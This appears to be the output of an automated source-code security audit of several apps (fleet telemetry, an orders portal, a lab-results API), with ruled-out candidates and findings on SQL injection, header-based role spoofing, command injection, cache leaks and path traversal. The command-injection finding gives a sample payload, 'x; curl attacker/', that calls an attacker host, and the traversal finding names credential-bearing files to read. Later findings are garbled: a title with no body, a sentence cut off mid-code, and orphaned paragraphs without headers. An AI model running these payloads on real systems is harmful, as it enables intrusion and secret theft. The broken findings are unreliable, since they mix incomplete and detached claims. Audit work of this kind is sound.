stages_run: mantis-meta-agent (supervisor; MODE-OFF, no --sync, stages executed inline sequentially per the documented sequential fallback because the harness caps subagent concurrency)
mantis-summarize (directory mapping folded into kb/ENTITIES.md; no per-directory mantis-summary.md written, since the target is read-only)
mantis-researcher (exhaustive read of all 60 files / 3147 lines; no sampling)
mantis-dedupe (merged per-app duplicates; e.g. the two fleet diagnostics queries and the two labtrack comment writers each became one finding)
mantis-review (13 negative constraints applied adversarially as FP-01..FP-13; 18 candidate assertions eliminated, listed in ruled_out)
mantis-critic (production-viability pass: dead-code and dev-only-guard candidates demoted to low or ruled out)
mantis-calibrate (severity and confirmed/probable assigned from evidence strength and reachability)
mantis-reflect (learnings recorded in-session; no transcript files exposed by this harness)
stages_skipped: mantis-history - the target is a plain directory with no VCS metadata (git rev-parse fails; no .git/.hg/.repo), so there is no history to mine for past vulnerability patterns.

mantis-structural-index - optional and HINT-only by its own contract; with 60 files and 3147 lines the whole corpus was read directly, so an index would add nothing and no SCIP/ctags backend is available offline.

mantis-reproduce - requires building and running the targets in a sandbox (Gradle/Micronaut, Nuxt, Node/Temporal, Litestar, Rails+Sidekiq+Redis, Firebase emulators). No package registry, no container runtime and no service dependencies are reachable offline, so no finding carries an executed reproducer. Every finding is therefore grounded in source-level evidence only, and confidence is expressed through the confirmed/probable status field.

mantis-chain - partially performed inline as cross-references inside individual findings (profile self-write -> org wildcard -> storage ownerId; unsigned Sidekiq job -> update_role! -> platform_admin -> Sidekiq console; unauthenticated order create -> idempotency replay -> share tokens). No separate Super Finding records were emitted, since the report contract has no field for them.

mantis-patch - the operator instruction is read-only on the target, and mantis-patch writes fixes and .bak files into the code root. Skipped deliberately; recommendations are given per finding instead.
provenance.triage_semantics: Each triage entry names one of mantis-review's 13 negative constraints as FP-01..FP-13, in the order they appear in mantis-review/SKILL.md section 3. answer='HOLDS' would mean the constraint fires and the finding is a false positive; reported findings therefore carry DOES_NOT_HOLD, NOT_APPLICABLE or UNKNOWN only. UNKNOWN marks a step that could not be verified offline and is paired with a 'probable' status.

ruled_out.assertion: ORDER BY column concatenated into the vehicle listing query is SQL-injectable
ruled_out.killed_by: The value is resolved by SORT_COLUMNS.getOrDefault(sort, "label") at VehicleController.java:53 against the three-entry immutable Map at lines 35-38, so only the literals 'label', 'odometer_km' and 'updated_at' can ever reach the concatenation. The mitigation is a genuine allow-list and is credited as working.

ruled_out.assertion: bundleName allows directory traversal out of the firmware staging directory
ruled_out.killed_by: @Pattern(regexp = "[A-Za-z0-9_.-]{1,48}") at VehicleController.java:106 admits dots but not the path separator, so no value can produce a parent-directory hop through Paths.get. The related deviceSerial argument, which is genuinely unconstrained, is reported separately as command injection.

ruled_out.assertion: customer_id interpolated into the order UPDATE is SQL-injectable
ruled_out.killed_by: The value originates at 01.session.ts:51 as Number(claims.cid) and is rejected unless Number.isInteger(customerId) && customerId > 0 (line 52). A JavaScript number interpolates as digits only, so no attacker-controlled text reaches the statement. The session payload is additionally HMAC-verified at lines 34-41.

ruled_out.assertion: Column names built from the patch object allow SQL identifier injection
ruled_out.killed_by: orderPatchSchema is declared .strict() (schemas.ts:28), so Object.entries can only yield slotId, status and note; every value is bound as $n. Flagging this would require positing a caller that bypasses the schema, which the sole caller ([id].patch.ts:10) does not.

ruled_out.assertion: Nitro's '/**' wildcard access-control-allow-origin leaks onto the authenticated /api routes
ruled_out.killed_by: Nitro resolves route rules by merging all matching patterns with the most specific taking precedence, so the '/api/**' block at lines 22-28 - which names the portal origin explicitly and adds a vary - overrides the '/**' wildcard for every /api path. The wildcard's real scope is the marketing and asset routes.

ruled_out.assertion: OFFSET built by arithmetic on the page argument is SQL-injectable
ruled_out.killed_by: The interpolated expression is page * 100. JavaScript multiplication coerces its operand to a number, so a string payload yields NaN and a syntax error rather than injected SQL; no string can survive the arithmetic. The caller additionally parses the value with z.coerce.number().int().min(0).max(50) at starter.ts:67.

ruled_out.assertion: carrier_code interpolated into the shipment update is SQL-injectable
ruled_out.killed_by: The interpolated variable is the value side of CARRIER_CODES.fetch(payload['carrier'], nil) (line 25) against the frozen five-entry hash at signed_payload.rb:9-15, and the worker returns early when the fetch yields nil (line 26). Only one of five fixed uppercase literals can reach the string.

ruled_out.assertion: offset() receiving a string enables SQL injection in the manifest query
ruled_out.killed_by: The interpolated expression is page * 50 where page is args['page'].to_i (line 17); Ruby's to_i yields an Integer for any input, so the interpolation is always a decimal literal. The genuinely unvalidated argument in this worker is filename, reported separately.

ruled_out.assertion: grant_without_checks! is reachable in production and bypasses the invite policy
ruled_out.killed_by: Traced its one call site rather than dismissing it on the 'seed helper' comment: it is guarded by Rails.env.development? && rows.empty? (line 19) and its arguments are the fixed literals 'demo@example.test' and 'owner' - no request-derived value reaches it. The real ceiling bypass on this worker is the per-row write at line 36, which is reported.

ruled_out.assertion: Public read on the catalog collection exposes sensitive data
ruled_out.killed_by: The collection holds hazard codes, form templates and units - reference data the app ships - and writes are denied outright at line 25. There is no user or org data at that path; treating a deliberately public read of static reference data as a flaw is exactly the hygiene noise rule 02 excludes.

ruled_out.assertion: Hardcoded JWT signing secret in the Micronaut configuration
ruled_out.killed_by: Checked reachability rather than assuming the /test path is safe: the file is under src/test/resources, is the -test profile only, and its own header names the throwaway docker-compose container. The production profile at src/main/resources/application.yml:29 sources the secret from ${JWT_SIGNING_SECRET} with no fallback, so the literal cannot be selected outside JUnit.

ruled_out.assertion: The schemaVersion < 2 branch bypasses screening, corridor checks and dual approval
ruled_out.killed_by: assertSchemaVersion(input.schemaVersion) runs first at line 40 and throws for any version below 2 (limits.ts:29-32), so the branch at line 58 is unreachable for exactly the inputs that would enter it. The starter also hardcodes schemaVersion: 3 at starter.ts:46.

ruled_out.assertion: ORDER BY direction and LIMIT interpolated into the panel query are SQL-injectable
ruled_out.killed_by: The controller annotates order as Literal['asc','desc'] and limit as int (results.py:46-47), and Litestar validates query parameters against those annotations before the handler body runs, rejecting anything else with a 400. The genuine defect in this function - the absent ordering_org predicate - is reported separately.

ruled_out.assertion: The bearer token HMAC comparison is exploitable (timing side channel or signature confusion)
ruled_out.killed_by: hmac.compare_digest is the correct constant-time primitive, the MAC is computed over the encoded body rather than the decoded claims, and expiry is enforced at line 41. The token is a bare HMAC envelope, not a JWT, so there is no algorithm field to confuse. Nothing here warrants a finding.

ruled_out.assertion: SignedPayload.verify! is vulnerable to a timing or length-extension attack
ruled_out.killed_by: OpenSSL.secure_compare digests both inputs before comparing, so it is both constant-time and safe for unequal lengths, and the comparison is over an HMAC rather than a raw hash. The exploitable defect nearby is the caller's decision not to invoke it, reported separately.

ruled_out.assertion: reseedCatalog allows arbitrary writes to the catalog collection with the Admin SDK
ruled_out.killed_by: The function is module-private: it is not on exports, not attached to either express app, and grep across fieldnotes finds no invocation. There is no request path that reaches it, and unlike a dormant injection sink it contains no intrinsic weakness of its own to preserve under rule 08.

ruled_out.assertion: Firebase web API key and project identifiers are hardcoded secrets
ruled_out.killed_by: The Firebase web config is public by design - it identifies the project rather than authorising access, which is what the rules files exist to do - and the committed values are the demo- prefixed quickstart placeholders behind import.meta.env fallbacks. Emulator wiring is gated on import.meta.env.DEV at line 23.

ruled_out.assertion: escapeHtml is incomplete and can be bypassed
ruled_out.killed_by: The function replaces &, <, >, double quote and single quote, which covers text-node and quoted-attribute contexts - the only contexts its callers use. The genuine defect is that one interpolation in the receipt template does not call it at all (db.ts:136), which is reported on its own.

findings.title: SQL injection in vehicle label search
findings.evidence: searchByLabel builds its statement with String.format: "... WHERE tenant_id = '%s' AND label ILIKE '%%%s%%' ..." (lines 54-57) and then hands the already-interpolated string to prepareStatement with no bound parameters (line 59). The `label` value arrives verbatim from the request: VehicleController.search declares `@QueryValue String label` (VehicleController.java:58) and passes it straight through. There is no allow-list, no escaping and no length bound on that parameter.
findings.impact: Any authenticated caller can terminate the literal and append arbitrary SQL to a query that already runs with the application's full database role. Because tenant_id is interpolated into the same statement, the injected clause also lets the attacker drop the tenant predicate and read every tenant's vehicle inventory, or pivot to UNION-based extraction of other tables.
findings.recommendation: Bind both values: keep the statement as `WHERE tenant_id = ? AND label ILIKE ?` and set the parameter to '%' + label + '%' via ps.setString, matching the style already used by depotBelongsTo (lines 68-71).

triage.reason: Ingress cited: VehicleController.java:58 `@QueryValue String label` on GET /api/vehicles/search; the query-string value reaches line 57 unmodified.
This is not a safe library used without paranoia - it is manual string formatting into SQL while a parameterised alternative is used in the same class.
File, class, method and lines verified against the snapshot; String.format begins at line 54 and the format string is at lines 55-56.
No hypothetical caller misuse is required; the only caller in the repository already forwards raw request input.

scope.established_by: Traced the single caller of searchByLabel by grep across fleet-telemetry, then confirmed the parameter is an unconstrained @QueryValue with no @Pattern on the record or the method signature.
scope.narrowed_by: Requires an authenticated bearer token (@Secured(IS_AUTHENTICATED) at VehicleController.java:30); it does not require any particular role.

findings.title: Effective role is taken from a client-supplied X-Fleet-Role header
findings.evidence: effectiveRole reads `request.getHeaders().get("X-Fleet-Role")` (line 25) and, if the value is one of the three KNOWN_ROLES, returns it in preference to the role claim carried in the signed JWT (lines 26-31). TenantFilter deliberately strips the sibling header `X-Fleet-Tenant` (TenantFilter.java:34) but never touches X-Fleet-Role, so nothing removes an attacker-supplied value. isFleetAdmin (line 35) is built directly on effectiveRole, and VehicleController.delete gates on it (VehicleController.java:79).
findings.impact: Any authenticated caller - including a plain `viewer` - can add `X-Fleet-Role: fleet_admin` to a request and pass the fleet-admin authorization check, letting them delete vehicles belonging to their tenant. The application's own comment states the edge resolves the role, but the service performs no verification that the header actually came from the edge.
findings.recommendation: Delete effectiveRole's header branch and resolve the role solely from the Authentication attributes. If an edge-supplied role is genuinely required, strip X-Fleet-Role in TenantFilter the same way X-Fleet-Tenant is stripped and re-inject it only from a channel the service can authenticate (mTLS peer identity or a separately signed header).

triage.reason: Ingress cited: RoleResolver.java:25 reads the request header directly; HTTP request headers are attacker-controlled by definition and the KNOWN_ROLES filter admits the privileged value.
This is not a missing hardening header - it is an authorization decision derived from an unauthenticated input.
The KNOWN_ROLES membership test is not a mitigation for this class: it constrains the value to a set that contains fleet_admin.
The function itself trusts the header; no caller misuse is needed.

scope.established_by: Enumerated every call site of effectiveRole/isFleetAdmin in fleet-telemetry, then checked TenantFilter's header-scrubbing block (lines 33-35) to confirm which of the three forwarded-headers listed in application.yml:52-55 are actually removed.
scope.narrowed_by: Only the isFleetAdmin call site at VehicleController.java:79 is affected. The firmware endpoint at VehicleController.java:87 uses Micronaut's `@Secured("fleet_admin")`, which reads the token's roles and is NOT bypassed by this header.

findings.title: Diagnostics endpoints ignore tenant scoping entirely
findings.evidence: recentFrames and openFaults both accept a tenantId argument and neither uses it: the statements are `WHERE vehicle_id = ?` (line 133) and `WHERE vehicle_id = ? AND cleared_at IS NULL` (lines 146-147). The tenantId parameter is bound to nothing. Worse, the value passed in is already null: TenantFilter only matches `/api/vehicles/**`, `/api/depots/**` and `/api/trips/**` (TenantFilter.java:19), so it never runs for `/api/diagnostics/**`, and DiagnosticsController's `request.getAttribute("tenantId").orElse(null)` (lines 34, 40) yields null on every request to that controller.
findings.impact: Any authenticated user of any tenant can read live OBD-II frames and open fault codes for any vehicle id in the fleet, including vehicles belonging to other customers. Vehicle ids are returned in plaintext by GET /api/vehicles, so enumerating them across tenants is not required - a peer tenant's ids leak by other means, and the id space is directly brute-forceable.
findings.recommendation: Add `AND tenant_id = ?` to both statements and bind it, and extend the TenantFilter pattern list to include `/api/diagnostics/**` so the attribute is populated (or make the missing attribute a hard failure rather than a silent null).

triage.reason: Ingress cited: DiagnosticsController.java:32 `@PathVariable String vehicleId` on GET /api/diagnostics/{vehicleId}/frames flows unmodified to the bound parameter at VehicleRepository.java:137.
Both methods and both SQL strings verified at the cited lines; the unused tenantId parameter is present in both signatures (lines 132, 145).
There is no mitigation to credit here: the filter that would supply the tenant is not wired to this controller's path.
Neither file sits under a test, mock or experimental path.

scope.established_by: Compared the @Filter pattern list in TenantFilter.java:19 against the @Controller paths declared in api/, then read both repository methods to check whether the tenantId argument reaches the SQL.
scope.narrowed_by: Requires an authenticated bearer token; the intercept-url-map in application.yml:35-37 keeps /api/** behind isAuthenticated(). No role is required.

findings.title: Command injection through the firmware verifier's device-serial argument
findings.evidence: verifyForDevice concatenates its arguments into a shell string (lines 52-53) and executes it with `new ProcessBuilder("/bin/sh", "-c", command)` (line 55). bundleName is constrained by `@Pattern(regexp = "[A-Za-z0-9_.-]{1,48}")` on the FirmwarePush record (VehicleController.java:106), but deviceSerial carries only `@NotBlank` (VehicleController.java:107) - shell metacharacters, spaces, backticks and `$(...)` all pass validation and land inside the `-c` string.
findings.impact: A caller holding the fleet_admin role can execute arbitrary commands as the service account by sending a device serial such as `x; curl attacker/`. That is full remote code execution on the telemetry host, which also holds the database credentials and the firmware staging directory.
findings.recommendation: Drop the shell: pass the verifier and its arguments as a String[] to ProcessBuilder so no shell parsing happens, and additionally constrain deviceSerial with a @Pattern equivalent to the one already applied to bundleName.

triage.reason: Ingress cited: VehicleController.java:90 `@Body @Valid FirmwarePush body` on POST /api/vehicles/{id}/firmware; body.deviceSerial() is forwarded at line 92 and reaches the command string at FirmwareService.java:53.
Reported on its live path rather than as a dormant primitive; the sink has a real caller.
Triggering is a single deterministic HTTP request, not a timing- or environment-dependent race.
This is not a review of a mitigation; there is no sanitisation on this argument to credit.

scope.established_by: Traced both arguments of verifyForDevice back to the FirmwarePush record and compared the two records' bean-validation annotations; only bundleName carries a character-class constraint.
scope.narrowed_by: Narrowed by two conditions checked in the code: the endpoint carries `@Secured("fleet_admin")` (VehicleController.java:87), which is evaluated against the token's roles and is not satisfied by the X-Fleet-Role header, and the method returns early unless `fleet.env` equals "production" (FirmwareService.java:48).

findings.title: Firmware bundles are staged before verification and the verification result is discarded
findings.evidence: pushFirmware calls `firmware.stageBundle(body.bundleName())` first (line 91), which copies the bundle into `<stagingDir>/outbox` - the slot FirmwareService's own comment says the device downloader watches (FirmwareService.java:28-29). Only afterwards does it call verifyForDevice (line 92), and it ignores the boolean that method returns, unconditionally answering HTTP 202 (line 93). A bundle whose signature check fails is therefore already sitting in the outbox and is never removed.
findings.impact: Signature verification of firmware is effectively advisory. An operator who can reach this endpoint can publish an unsigned or tampered bundle to the device download slot; the vehicles' control units receive it regardless of the verifier's verdict.
findings.recommendation: Verify into a quarantine directory first and promote to the outbox only when verifyForDevice returns true; return 4xx and delete the staged file when it returns false.

triage.reason: The defect is in this handler's own ordering and its discarded return value, not in a hypothetical caller.
Line 91 stageBundle, line 92 verifyForDevice, line 93 unconditional accepted() - all verified; stageBundle's target path is FirmwareService.java:33.
This is an integrity control that exists and is bypassed, not a missing defence-in-depth nicety.
No resource-exhaustion claim is made.

scope.established_by: Read the handler's statement order and matched stageBundle's target path against the comment describing the outbox as the device-facing slot.
scope.narrowed_by: Requires the fleet_admin role enforced by @Secured at VehicleController.java:87.

findings.title: Firmware signature verification is skipped outside the production environment
findings.evidence: verifyForDevice opens with `if (!"production".equals(env)) { return true; }` (lines 48-51). `env` is bound from `${fleet.env}` (line 21), which application.yml:48 defaults to `staging` when FLEET_ENV is unset. Every non-production deployment - and any production deployment whose FLEET_ENV variable is missing or misspelled - therefore reports every bundle as validly signed.
findings.impact: Staging and pre-production fleets accept arbitrary firmware. Because the environment name is supplied by an environment variable with a permissive default, a deployment error silently converts the production fleet into the same fail-open state rather than failing loudly.
findings.recommendation: Invert the default: treat any environment value other than an explicit allow-listed non-production name as production, and fail closed (return false / raise) when the vendor tool is unavailable rather than returning true.

triage.reason: The skipped step is a signature check, not a hygiene header, and the switch is a runtime configuration value rather than a compile-time test flag.
The branch is in production source under src/main, not in a test tree; it is selected by configuration at runtime.
Lines 48-51 and the ${fleet.env} binding at line 21 verified; the staging default is at application.yml:48.
There is no mitigation to credit - this is the absence of the check.

scope.established_by: Followed the @Value binding for fleet.env to its declaration in application.yml and read the default expressed there.
scope.narrowed_by: Narrowed to deployments where fleet.env resolves to anything other than the literal "production"; on a correctly configured production host the real verifier does run.

findings.title: Cross-tenant depot reassignment on vehicle update
findings.evidence: create checks that the submitted depot belongs to the caller's tenant before inserting (`if (!vehicles.depotBelongsTo(body.depotId(), tenantId)) return FORBIDDEN`, lines 65-67). update accepts the same VehicleForm - including depotId - and performs no such check (lines 71-75); VehicleRepository.update writes `depot_id = ?` from the body (line 106) and scopes only the WHERE clause by tenant (line 104).
findings.impact: A caller can move one of their own vehicles into another tenant's depot by supplying that depot's id, corrupting the other tenant's depot roster and any downstream routing or billing keyed on depot membership. The inline comment at line 73 asserts the update statement provides the scoping, which is true for the row but not for the foreign key being written into it.
findings.recommendation: Apply the same depotBelongsTo check in update before calling the repository, or enforce it in SQL with an `AND EXISTS (SELECT 1 FROM depots WHERE id = ? AND tenant_id = ?)` clause on the UPDATE.

triage.reason: Ingress cited: VehicleController.java:72 `@Body @Valid VehicleForm body`; depotId carries only @NotBlank (line 102) and flows to VehicleRepository.java:106.
The omission is in this handler, which is the only writer of depot_id on the update path.
Whether a foreign-key or check constraint on the depots table rejects a cross-tenant depot_id cannot be determined - no schema or migration ships in the snapshot.
No mitigation of this class is present to stretch around.

scope.established_by: Diffed the create and update handlers for the same request body type and listed which fields each validates before persisting.
scope.narrowed_by: Narrowed by the UPDATE's `AND tenant_id = ?` predicate (VehicleRepository.java:104): the attacker can only rewrite the depot of a vehicle they already own, not reach another tenant's vehicle row.

findings.title: Dormant SQL injection in the retained legacy purge helper
findings.evidence: legacyPurgeByLabel builds `"DELETE FROM vehicles WHERE label = '" + label + "'"` (line 160) and executes it. The method is private, annotated @SuppressWarnings("unused") and has no caller anywhere in the snapshot; its comment says it is kept while an archive migration is in flight.
findings.impact: No live request path reaches it today, so there is no exploitable impact in the current build. It is a fully formed injection sink one call site away from being live, sitting in the same class whose other methods already receive raw request input, and the DELETE has no tenant predicate at all.
findings.recommendation: Delete the method, or rewrite it with a bound parameter and a tenant_id predicate before the migration work re-attaches a caller to it.

triage.reason: Mantis rule 08 explicitly keeps an intrinsic injection path valid even when it has no current caller; that is the whole basis for reporting this at low severity.
Rule 13's trust-boundary requirement is waived for rule-08 intrinsic flaws by its own stated exception.
Method, annotation and line 160 verified in the snapshot.
The file is production repository code, not a test or mock path.

scope.established_by: Grepped the whole of fleet-telemetry for legacyPurgeByLabel and found the declaration and no invocation.
scope.narrowed_by: Narrowed by reachability: the method is private with zero call sites in the snapshot, which is why this is filed low rather than high.

findings.title: Wildcard CORS origin on the telemetry API
findings.evidence: The `public-read` CORS configuration sets `allowed-origins: [".*"]` (lines 12-13) with no `allowed-origins-regex` path or URL-pattern restriction, so it applies to every response the Netty server emits, including the authenticated /api/** routes. Methods are limited to GET (lines 14-15) and `allow-credentials` is false (line 20).
findings.impact: Any origin may issue cross-origin GETs and read the responses. Because allow-credentials is false and the API authenticates with a bearer token rather than a cookie, a browser will not attach the victim's credentials, so this does not by itself expose authenticated data - the practical effect is that any site can read whatever the endpoints serve unauthenticated and can probe the API surface from a victim's network position.
findings.recommendation: Replace the `.*` entry with the explicit partner origin list, and scope the configuration with a path pattern so it cannot widen the authenticated /api/** routes.

triage.reason: A wildcard allowed-origins entry is an actively permissive access-control setting, not an omitted hardening header - though the low severity reflects that credentials are disabled.
No adjacent class is being invented; the finding is confined to what the wildcard origin itself permits.
Configuration block and lines verified.
No DoS claim.

scope.established_by: Read the single CORS configuration block; there is exactly one, named public-read, and it carries no path or URL-pattern key to bound it.
scope.narrowed_by: Narrowed by `allowed-methods: [GET]` (line 15) and `allow-credentials: false` (line 20), which together prevent the browser from attaching the caller's bearer token or performing state-changing cross-origin requests.

findings.title: Billing webhook accepts unsigned requests when the shared secret is unset
findings.evidence: signatureMatches returns true before comparing anything when `secret` is falsy (lines 16-20). The secret it receives is `config.billingWebhookSecret`, declared as `process.env.BILLING_WEBHOOK_SECRET ?? ''` (nuxt.config.ts:9) - an empty string, not undefined, whenever the variable is absent. The route is also on the session middleware's OPEN_PREFIXES list (01.session.ts:4), so nothing else authenticates it.
findings.impact: If the environment variable is missing or empty in any deployment, the webhook accepts arbitrary unsigned POSTs. An attacker can then send `charge.succeeded` to mark any draft order as scheduled while setting total_cents to a value of their choosing (lines 40-46), or `charge.refunded` to cancel any order by id (line 61) - fulfilment and refund state driven entirely by unauthenticated input.
findings.recommendation: Fail closed: treat a missing secret as a configuration error and reject with 500 (or refuse to boot). If an emulator mode is genuinely needed, gate it on an explicit, separately named flag that production configuration cannot reach by omission.

triage.reason: Ingress cited: webhook.post.ts:31 readRawBody and line 34's getHeader on an unauthenticated public route; the whole request is attacker-authored.
The check exists and is bypassed by its own default configuration; this is not a missing control.
The HMAC comparison at lines 24-27 is correct, but the finding is the branch that never reaches it.
Deterministic: one POST with no signature header reproduces it whenever the secret is empty.

scope.established_by: Followed config.billingWebhookSecret back to its runtimeConfig declaration and read the `?? ''` fallback, then confirmed the route is exempted from session handling at 01.session.ts:4.
scope.narrowed_by: Narrowed to deployments where BILLING_WEBHOOK_SECRET is unset or empty; where it is populated, the timing-safe comparison at lines 24-27 is sound.

findings.title: Per-customer order responses are cached by route rule and served across sessions
findings.class: Sensitive data exposure via shared cache
findings.evidence: `'/api/orders/**': { swr: 120 }` (line 31) enables Nitro's stale-while-revalidate response cache on every route under /api/orders/, which includes GET /api/orders/[id]. That handler returns data scoped to the caller: it looks the order up with `orderForCustomer(id, session.customerId)` ([id].get.ts:8) and returns note, totalCents and shareToken ([id].get.ts:13-20). Nitro's cache key is derived from the request path; the rule declares no `varies` on Cookie or any session input, and a cache hit short-circuits the handler so the customer_id predicate in db.ts:47 is never evaluated.
findings.impact: The first customer to fetch /api/orders/<id> populates a 120-second cache entry that is then served to every subsequent requester of the same URL, including a different signed-in customer or - because the cached hit bypasses the handler - a caller the ownership check would have rejected with 404. The leaked payload includes the delivery note, the order total and the share token that grants no-auth access to the delivery view.
findings.recommendation: Remove the swr rule from the authenticated order routes. If caching is needed for the courier-polling case, move it to a dedicated public endpoint that returns no customer-scoped fields, or set an explicit `varies` on the session cookie so entries cannot be shared between callers.

triage.reason: Ingress cited: [id].get.ts:5 getRouterParam supplies the id and the request path becomes the cache key; a second, unrelated caller requesting the same path is the attacker-controlled step.
This is not a missing cache-control header - it is an affirmative server-side cache placed in front of an authorization check.
No caller misuse required; the route rule and the handler as written already conflict.
Route rule at nuxt.config.ts:31, handler and its session scoping at [id].get.ts:6-8, all verified.

scope.established_by: Matched the routeRules glob against the files present under server/api/orders/ and identified which of them are GET handlers (only [id].get.ts), since Nitro's route-rule cache applies to cacheable GET responses.
scope.narrowed_by: Narrowed to GET /api/orders/[id]; the sibling PATCH and the collection POST are not cached by this rule. Entries expire after the 120-second window.

findings.title: POST /api/orders escapes the authorization middleware and trusts a body-supplied customerId

findings.title: Idempotency replay cache is keyed only on the client-chosen header
findings.evidence: recordIdempotent looks the stored response up with `store.getItem(key)` where key is the raw `Idempotency-Key` request header (index.post.ts:14, 19) and stores it under the same key for 24 hours (db.ts:120-125). Nothing namespaces the entry by customer, session or request body, and the backing store is a shared Redis instance (nuxt.config.ts:38).
findings.impact: Any caller who sends an Idempotency-Key that another customer used within the last 24 hours receives that customer's cached create response verbatim - order id and share_token included - without their order ever being created. Combined with the unauthenticated create path, an attacker can harvest other customers' order ids and share tokens by replaying guessable key values, and can also suppress a legitimate customer's order by pre-seeding the key they are about to use.
findings.recommendation: Namespace the key with the authenticated customer id and a hash of the request body (`${customerId}:${sha256(body)}:${key}`), and refuse the request when the key is reused with a different body.

triage.reason: Ingress cited: index.post.ts:14 getHeader(event,'idempotency-key') - the cache key is a raw request header.
The problem is not a lack of paranoia around a safe library but the absence of any tenancy in the key namespace.
The only caller already passes the raw header; no misuse needs to be imagined.
The claim is cross-customer disclosure, not resource exhaustion.

scope.established_by: Read the only call site of recordIdempotent and traced the key argument back to the request header; checked the storage declaration in nuxt.config.ts to confirm the store is shared rather than per-session.
scope.narrowed_by: Narrowed by the 24-hour TTL set at db.ts:125 and by the fact that only the create response is cached this way.

findings.title: Share tokens are generated from Math.random
findings.evidence: newShareToken draws 12 characters from a 33-character alphabet using `Math.random()` (lines 37-42). Math.random in V8 is an xorshift128+ generator that is neither seeded from a CSPRNG in a way that resists recovery nor forward-secure: an observer holding a handful of consecutive outputs can solve for the internal state and predict subsequent values. The token is the sole authenticator for the share link printed on the packing slip (db.ts:33-35, 137).
findings.impact: An attacker who obtains a few share tokens - trivially, by creating orders themselves, which the unauthenticated create path allows - can recover the generator state and predict the tokens minted for other customers' orders, gaining access to their delivery window, address context and order contents without signing in.
findings.recommendation: Generate the token with `crypto.randomBytes` (or `crypto.randomUUID`) and encode it, keeping the same length or longer.

triage.reason: Using a non-cryptographic PRNG to mint a bearer credential is exactly the intrinsic-weakness class rule 08 keeps valid.
Math.random is not a secure standard-library primitive being used without extreme paranoia - it is the wrong primitive for a credential.
State recovery from V8's xorshift128+ is a documented, automatable technique, not an unstable timing dependency.
Function and lines verified; the token's role as an unauthenticated access handle is stated in the doc comment at db.ts:33-35.

scope.established_by: Located the single generator and its single consumer (insertOrder at db.ts:74), then confirmed from the doc comment and the receipt URL at db.ts:137 that the token is used as a standalone access credential.

findings.title: Order note is stored unescaped on the PATCH path and rendered raw into the receipt email

The create path sanitises on the way in - `note: escapeHtml(body.note ?? Depending on the mail client and on whether the same template is reused in any web view, this yields HTML injection into a message the business sends on its own behalf - link spoofing and content forgery at minimum, script execution wherever the receipt is rendered in a browser context.
findings.recommendation: Escape at render time rather than at one of two write paths: change line 136 to use escapeHtml(order.note) so every writer is covered, and drop the input-time escaping that currently double-encodes the create path.

The billing webhook treats `scheduled` as the paid state: it is the value it writes on charge.succeeded, and only for a row still in `draft` (webhook.post.ts:42-43). LOCKED_STATUSES is a real mitigation and is credited - the finding is confined to the statuses it deliberately leaves writable.

It is nonetheless a live injection sink in an exported helper sitting beside correctly parameterised siblings in the same module, so a second caller that forwards a less constrained value - a reporting or admin route, for instance - turns it into a direct injection with no further change.

triage.reason: Rule 08 keeps a direct injection path in a function's own logic valid independent of its current callers, which is the sole reason this is reported.
Rule 13's trust-boundary requirement is waived for rule-08 intrinsic flaws by its own stated exception; the current caller is in fact enum-constrained.
The module uses parameterised queries everywhere else, so this is a deviation from its own safe pattern rather than pedantry about a safe library.
Function, line and the single call site verified.

Waived by rule 08's stated exception; there is no live data-flow path to cite because there is no caller.

findings.title: The global patient-scope guard never fires because its path prefix omits the API version segment
findings.evidence: require_patient_scope returns immediately unless `connection.scope['path'].startswith('/api/results')` (lines 71-73). The application mounts every controller under `path='/api/v1'` (app.py:44) and ResultsController adds `path='/results'` (results.py:30), so the real ASGI paths are `/api/v1/results/...`. That never starts with `/api/results`, so the guard's early return is taken on every request and neither the `results:read` scope check (line 76) nor the care-link check (lines 79-81) is ever evaluated - even though it is registered as an application-wide guard (app.py:46).

Any principal holding any valid token - including `billing-sync`, which is registered for reports:read only (settings.py:27) - can read results, and any operator can read results for patients they have no care link to by calling GET /api/v1/results/patient/{patient_id}. Only the org_id predicate inside results_for_patient (store.py:39) still limits the blast radius, and it does not limit it to the caller's own patients.

findings.title: Cached report is returned before the ordering-organisation check
findings.class: Broken access control / cache-based cross-tenant disclosure
findings.evidence: The handler consults the cache first and returns on a hit (lines 23-25). The authorization check - `row['ordering_org'] != request.scope['user']['org_id']` - is on lines 27-29, after that early return, and the cache key is derived from the result id alone (`'report:' + sha256(result_id)`, render.py:41). So once any principal renders a report, the HTML is served from Redis to every subsequent requester of that result id, whatever organisation they belong to, for report_cache_seconds (settings.py:19, default 600).
findings.impact: Cross-organisation disclosure of patient health information. A principal at organisation B who requests a result id belonging to organisation A gets the full rendered report - patient identifier, panel, all measured values and the clinician comment - provided anyone at organisation A viewed it in the preceding ten minutes. Result ids are returned in bulk by GET /api/v1/results/panel/{panel_code}/recent, which is not org-scoped, so ids for other organisations are directly obtainable.
findings.recommendation: Move the cache lookup below the ownership check, or include the caller's org_id in the cache key so entries cannot be shared across organisations.

triage.reason: Ordering verified: cached_report at line 23, the early return at lines 24-25, and the org comparison at line 28; the key derivation is at render.py:40-41.
Ingress cited: reports.py:22 `result_id: str` bound from the URL of GET /api/v1/reports/{result_id}.
The ordering defect is inside this handler; no caller misuse is required.
The org check is a genuine mitigation, which is precisely why placing it after the return path matters.

scope.established_by: Read the handler top to bottom to establish statement order, then read _cache_key to confirm the key contains no principal-derived component.
scope.narrowed_by: Narrowed by the cache TTL at settings.py:19 (600s by default) and by the requirement that some principal has rendered that specific result id within the window.

findings.title: Path traversal in the report attachment endpoint
findings.evidence: The route is declared `@get('/attachments/{name:path}')` (line 35), so `name` captures the remainder of the URL including slashes. The handler builds `Path(settings.attachment_root) / name.lstrip('/')` (line 37) and reads the file (line 41). `lstrip('/')` removes leading separators only; it does nothing about `..` segments, and pathlib's `/` operator performs no containment check. There is no resolve-and-verify step against attachment_root.
findings.impact: Any principal with a valid bearer token can read arbitrary files readable by the service account - `/etc/passwd`, the process environment via /proc/self/environ, and most damagingly the deployment's LABTRACK_TOKEN_KEY and database DSN, which would let them forge tokens for any organisation and role. The response also echoes the basename in a content-disposition header (line 43).
findings.recommendation: Resolve the candidate path and require containment before reading: `target = (Path(root) / name).resolve()` then `if not target.is_relative_to(Path(root).resolve()): raise NotFoundException`. Rejecting any name containing '..' is a useful additional guard but not a substitute for the resolve check.

triage.reason: Ingress cited: reports.py:36 `name: str` bound from the `{name:path}` URL segment of GET /api/v1/reports/attachments/*, entirely attacker-authored.
lstrip('/') is not a traversal mitigation - it strips leading separators and leaves '..' untouched - so there is no working mitigation to credit.
Route decorator at line 35, path construction at line 37 and the read at line 41 all verified.
A single GET reproduces it deterministically.

